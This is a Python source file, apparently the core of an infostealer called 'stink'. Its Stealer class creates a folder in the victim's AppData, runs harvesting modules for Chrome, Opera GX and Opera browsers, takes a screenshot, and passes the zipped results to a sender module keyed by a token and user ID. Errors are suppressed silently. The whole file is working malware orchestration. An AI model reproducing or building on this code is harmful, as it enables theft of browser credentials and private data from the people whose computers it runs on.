from shutil import rmtree
from os import path, mkdir
from getpass import getuser
from threading import Thread

from .modules.sender import Sender
from .modules.screen_grabber import Screen_Grabber

from .browsers.chrome import Chrome
from .browsers.opera_gx import Opera_GX
from .browsers.opera_default import Opera_Default


class Stealer(Thread):

    def __init__(self, token: str, user_id: int, errors_print: bool = False):
        Thread.__init__(self, name="Stealer")

        self.token = token
        self.user_id = user_id
        self.errors_print = errors_print

        self.user = getuser()
        self.zip_name = f"{self.user}-st"
        self.storage_path = f"C:/Users/{self.user}/AppData/"
        self.storage_folder = "stink/"

        self.browsers = [
            {
                "method": Chrome(
                    self.storage_path,
                    self.storage_folder,
                    self.errors_print
                )
            },
            {
                "method": Opera_GX(
                    self.storage_path,
                    self.storage_folder,
                    self.errors_print
                )
            },
            {
                "method": Opera_Default(
                    self.storage_path,
                    self.storage_folder,
                    self.errors_print
                )
            }
        ]

    def __create_storage(self):

        if not path.exists(f"{self.storage_path}{self.storage_folder}"):

            mkdir(f"{self.storage_path}{self.storage_folder}")

        else:

            rmtree(f"{self.storage_path}{self.storage_folder}")
            mkdir(f"{self.storage_path}{self.storage_folder}")

    def run(self):

        try:

            self.__create_storage()

            for browser in self.browsers:
                browser["method"].run()

            Screen_Grabber(self.storage_path, self.storage_folder, self.errors_print).run()
            Sender(self.zip_name, self.storage_path, self.storage_folder, self.token, self.user_id, self.errors_print).run()

        except Exception as e:

            if self.errors_print is True:

                print(f"[MULTISTEALER]: {repr(e)}")

            else:

                pass
